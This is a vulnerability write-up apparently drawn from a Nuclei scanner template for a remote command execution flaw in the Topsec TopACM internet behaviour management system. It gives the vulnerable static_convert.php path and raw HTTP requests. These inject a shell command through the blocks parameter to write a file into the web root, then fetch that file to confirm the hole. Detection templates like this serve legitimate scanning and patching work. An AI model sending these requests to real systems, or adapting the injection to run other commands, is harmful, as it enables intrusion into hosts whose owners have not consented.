# Nuclei Template: Topsec Topacm - Remote Code Execution
**Template ID:** topsec-topacm-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`topsec-topacm-rce.yaml`)

## Vulnerability Information & PoC

## Description
Tianrongxin Internet Behavior Management System static_convert.php remote command execution vulnerability

## Steps to reproduce / Exploit Payload
```http
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20echo%20%27{{randstr}}%27%20%3E%20/var/www/html/config_application.txt%0a HTTP/1.1
Host: {{Hostname}}

GET /config_application.txt HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/TRXController.java
- https://github.com/Phuong39/2022-HW-POC/blob/main/天融信-上网行为管理系统RCE.md
